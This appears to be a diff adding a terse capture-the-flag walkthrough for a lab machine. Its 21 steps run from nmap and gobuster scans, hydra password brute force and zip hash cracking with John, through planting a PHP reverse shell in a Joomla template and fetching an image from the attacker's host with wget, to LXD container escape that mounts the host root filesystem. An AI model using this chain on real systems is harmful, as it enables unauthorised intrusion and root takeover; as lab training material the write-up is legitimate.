@@ -1,0 +1,21 @@
+1 - nmap -A 10.10.161.171
+2 - gobuster dir -u http://10.10.161.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,js,txt
+3 - hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.161.171 http-get
+4 - http://10.10.161.171/backup.zip
+5 - zip2john backup.zip > hash
+6 - john hash
+7 - unzip backup.zip
+8 - dbeaver joomladb.sql
+9 - search cc1gr_users
+10 - john hash -w=/usr/share/wordlists/rockyou.txt
+11 - http://10.10.161.171:8080/administrator/
+12 - Configuration -> Templates -> Templates -> beez3 -> error.php
+13 - cp /usr/share/webshells/php/php-reverse-shell.php .
+14 - http://10.10.161.171:8080/templates/beez3/error.php
+15 - wget http://10.8.94.51:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+16 - lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz
+17 - lxc init cd73881adaac joker -c security.privileged=true
+18 -  lxc config device add joker cd73881adaac disk source=/ path=/mnt/root recursive=true
+19 - lxc start joker
+20 - lxc exec joker /bin/sh
+21 - cat /root/final.txt
